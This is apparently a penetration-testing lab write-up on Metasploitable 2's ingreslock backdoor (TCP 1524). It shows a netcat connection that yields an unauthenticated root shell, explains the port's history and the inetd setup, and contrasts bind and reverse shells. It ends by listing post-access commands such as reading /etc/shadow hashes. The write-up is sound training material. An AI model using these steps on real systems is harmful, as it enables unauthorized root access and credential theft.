title: Unauthenticated Root Bindshell: Ingreslock (TCP 1524) Analysis
summary: Demonstrated instant unauthenticated root compromise via TCP port 1524 (ingreslock) using basic netcat (nc). Verified complete system control with uid=0(root), explored the underlying UNIX historical lineage of the Ingreslock backdoor, and established the operational distinction between bindshells and reverse shells in penetration testing.

blocks.text: Following the port scan that flagged `1524/tcp open bindshell`, executed a direct raw TCP connection from Kali Linux using Netcat (`nc`):

blocks.label: kali
blocks.text:
┌──(general㉿lee)-[~]
└─$ nc -vn 10.16.141.205 1524
(UNKNOWN) [10.16.141.205] 1524 (ingreslock) open
root@metasploitable:/# 

root@metasploitable:/# id
uid=0(root) gid=0(root) groups=0(root)

root@metasploitable:/# whoami
root

root@metasploitable:/# uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
No username, password, or cryptographic handshake was requested. The target immediately returned an interactive root prompt with full system authority (`uid=0, gid=0`).

sections.h: Why does Port 1524 exist? (The Ingreslock Story)

blocks.text: Port 1524 is registered in IANA and `/etc/services` as **`ingreslock`**—originally used by the Ingres relational database management system for its locking service.

In early UNIX history, system crackers and rootkit authors frequently bound an interactive `/bin/sh` listener to port 1524. Because `ingreslock` appeared legitimate in service tables, administrators glancing at basic network outputs often overlooked the listening port.

In Metasploitable 2, this is configured via `openbsd-inetd` (`/etc/inetd.conf`), instructing the superserver to automatically pipe stdin and stdout of `/bin/sh` to any inbound connection on port 1524.

sections.h: Architectural Distinction: Bind Shell vs Reverse Shell

head: Shell Type
How Connection is Established
Defensive / Firewall Impact
rows: The target opens a listening port and waits for the attacker to connect inward (`Kali -> Target:1524`).
Easily blocked by perimeter firewalls or NAT if inbound non-standard ports are denied. Only works because we are on the same local subnet.
The target initiates an outbound TCP connection back to the attacker's listener (`Target -> Kali:4444`).
Much more effective in real-world scenarios because egress firewall rules typically allow outbound connections (e.g. ports 80, 443).

blocks.text: With unrestricted root access on the machine, you can observe critical OS security files that normal users cannot read:

items: `cat /etc/shadow` — View password hashes for all accounts (`msfadmin`, `root`, `user`).
`cat /etc/inetd.conf | grep 1524` — See the exact line spawning the backdoor shell.
`netstat -tulnp` — See all internal listening sockets from the kernel's perspective.
